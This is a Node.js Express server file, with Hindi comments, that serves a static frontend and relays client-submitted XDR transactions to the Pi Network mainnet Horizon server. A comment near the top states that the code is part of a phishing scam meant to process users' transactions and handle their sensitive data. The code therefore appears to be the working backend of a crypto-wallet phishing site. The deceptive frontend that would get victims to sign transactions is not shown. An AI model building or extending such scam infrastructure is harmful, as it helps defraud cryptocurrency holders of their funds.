const express = require('express');
const path = require('path');
const cors = require('cors');
// stellar-sdk को सही तरीके से इम्पोर्ट करें
const StellarSdk = require('stellar-sdk');

const app = express();

// --- चेतावनी: यह कोड एक धोखाधड़ी (Phishing Scam) का हिस्सा है ---
// --- इसका उद्देश्य उपयोगकर्ता के ट्रांजैक्शन को प्रोसेस करना और संभावित रूप से संवेदनशील डेटा को संभालना है ---

// Pi नेटवर्क का Horizon सर्वर
const PI_HORIZON_SERVER = 'https://api.mainnet.minepi.com';
// सही तरीका: StellarSdk.Horizon.Server का उपयोग करें
const server = new StellarSdk.Horizon.Server(PI_HORIZON_SERVER, { allowHttp: true });

// Middleware
app.use(express.json({ limit: '10mb' }));
app.use(cors());
app.use(express.static(path.join(__dirname, 'public')));

// API Endpoint: ट्रांजैक्शन सबमिट करने के लिए
app.post('/api/submitTransaction', async (req, res) => {
  const { xdr } = req.body;

  if (!xdr) {
    return res.status(400).json({ success: false, error: 'XDR is missing' });
  }

  try {
    // सही तरीका: StellarSdk.TransactionBuilder का उपयोग करें
    const transaction = StellarSdk.TransactionBuilder.fromXDR(xdr, StellarSdk.Networks.PUBLIC);

    console.log('Backend received XDR. Submitting to Pi Network...');
    
    const txResponse = await server.submitTransaction(transaction);

    console.log('Transaction successful on Horizon:', txResponse.hash);
    res.json({
      success: true,
      message: 'Transaction submitted successfully!',
      hash: txResponse.hash,
      result: txResponse
    });
  } catch (error) {
    let errorDetails = {
      title: "Unknown Server Error",
      detail: "An unknown error occurred on the backend."
    };
    
    if (error.response && error.response.data) {
        console.error('Horizon Submission Error:', JSON.stringify(error.response.data, null, 2));
        errorDetails = error.response.data;
    } else {
        console.error('Generic Backend Error:', error.message);
        errorDetails.detail = error.message;
    }

    res.status(400).json({
      success: false,
      error: 'Transaction submission failed',
      details: errorDetails
    });
  }
});

// Catch-all
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
